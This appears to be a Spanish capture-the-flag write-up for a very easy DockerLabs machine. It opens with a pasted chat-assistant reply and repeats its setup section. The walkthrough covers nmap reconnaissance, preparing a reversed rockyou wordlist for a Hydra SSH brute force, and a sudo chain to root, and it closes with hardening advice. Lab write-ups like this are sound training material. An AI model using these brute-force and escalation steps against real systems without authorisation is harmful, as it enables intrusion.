Gracias por aclararlo. Aquí tienes el **inicio corregido y mejorado** para que marque claramente que estás comenzando el análisis de una nueva máquina:

---

# 🖥️ Nueva Máquina: **BorazuwarahCTF**  
🔹 **Dificultad:** Muy Fácil  

---

## 📌 Descripción

**BorazuwarahCTF** es una máquina de práctica alojada en **DockerLabs**, ideal para quienes se están iniciando en el **pentesting**. Permite familiarizarse con técnicas básicas como:

- Ataques de fuerza bruta con **Hydra**  
- Extracción de metadatos desde archivos  
- Escalada de privilegios a través de configuraciones de **sudo** mal gestionadas  

![Logo de la máquina](/HedgeHog/Imagenes/Logo.png)

---

## 🧰 Preparativos

Descargamos e iniciamos la máquina vulnerable con el siguiente comando:

```bash
sudo bash auto_deploy.sh hedgehog.tar
```

![Inicio de la máquina](/HedgeHog/Imagenes/Iniciar.jpeg)

---

¿Quieres que este encabezado se repita cada vez que inicies una máquina nueva en tus documentos o videos?

---

## 🚀 Inicio

![Inicio](/HedgeHog/Imagenes/Logo.png)

Primero, descargamos e iniciamos la máquina vulnerable con el comando:

```bash
sudo bash auto_deploy.sh hedgehog.tar
```

![Iniciar máquina](/HedgeHog/Imagenes/Iniciar.jpeg)

---

## 📡 Verificar Conectividad

Hacemos un _ping_ a la IP de la máquina para confirmar que está activa. Usando el **TTL** (_Time To Live_) también podemos inferir el tipo de sistema operativo (Linux o Windows). Nota: estos valores pueden ser modificados.

```bash
ping 172.17.0.2
```

![Ping](/HedgeHog/Imagenes/Ping.jpeg)

---

## 🔍 Reconocimiento de Puertos

Iniciamos con un escaneo completo de puertos utilizando **nmap**:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Gracias a esto, descubrimos que están abiertos los puertos:

- **22 (SSH)**  
- **80 (HTTP)**

![Puertos Abiertos](/HedgeHog/Imagenes/Puerto.jpeg)

Tengo un script para extraer los puertos e IPs del archivo generado por nmap:

```bash
extractPorts allPorts.txt
```

Luego hacemos un escaneo más detallado en los puertos encontrados:

```bash
nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
```

![Servicios detectados](/HedgeHog/Imagenes/Servicios.jpeg)

---

## 🌐 Análisis Web

Accedemos al servicio HTTP y encontramos un posible nombre de usuario para SSH. Confirmamos la tecnología usada en el sitio con:

```bash
whatweb 172.17.0.2
```

Probamos también con **Gobuster** y **Wfuzz** para buscar directorios o subdominios ocultos, pero no se encontró nada relevante.

![Página web](/HedgeHog/Imagenes/Pagina.jpeg)

---

## 🔓 Fuerza Bruta con Hydra

Al no tener éxito con métodos convencionales, intentamos un ataque por fuerza bruta con **Hydra**, pero fue lento, así que decidimos invertir el diccionario `rockyou.txt` para comenzar por las contraseñas menos comunes:

```bash
tac /usr/share/wordlists/rockyou.txt >> /usr/share/wordlists/rockyou_invertido.txt
```

Verificamos que hay espacios no deseados:

```bash
cat /usr/share/wordlists/rockyou_invertido.txt | head
```

Eliminamos los espacios:

```bash
sed -i 's/  //g' /usr/share/wordlists/rockyou_invertido.txt
```

¡Listo para usar con Hydra!

![Hydra ataque](/HedgeHog/Imagenes/Hydra.jpeg)

---

## 🧠 Escalada de Privilegios

Una vez dentro con las credenciales encontradas, analizamos cómo escalar de `tails` a `root`.

### 🔐 Paso 1: Verificar permisos de sudo

```bash
sudo -l
```

Resultado:

```bash
User tails may run the following commands on 04d3ae7efbc6:
    (sonic) NOPASSWD: ALL
```

Esto indica que `tails` puede ejecutar cualquier comando como el usuario `sonic` sin contraseña.

---

### 🔄 Paso 2: Intentar acceder al home de sonic

```bash
cd /home/sonic/
# Resultado: Permission denied
```

---

### 👤 Paso 3: Cambiar a sonic

```bash
sudo -u sonic /bin/bash
```

Ya como sonic, verificamos si también puede usar sudo:

---

### 🔼 Paso 4: Escalar a root desde sonic

```bash
sudo -u root /bin/bash
```

Y finalmente:

```bash
whoami
# Resultado: root
```

¡Acceso root conseguido!

![Escalada de privilegios](/HedgeHog/Imagenes/Privilegio.jpeg)

---

## ❓ ¿Por qué funcionó?

Aunque `tails` no podía ser root directamente, sí podía ejecutar comandos como `sonic`, y **sonic** tenía privilegios sudo sin restricción, lo que permitió encadenar el acceso a `root`.

---

## 🔒 Recomendación de Seguridad

- Evitar configuraciones como `NOPASSWD: ALL` sin una razón clara.
- Auditar el archivo `/etc/sudoers` y aplicar el principio de **mínimos privilegios**.
- Monitorizar el uso de cuentas con acceso sudo.

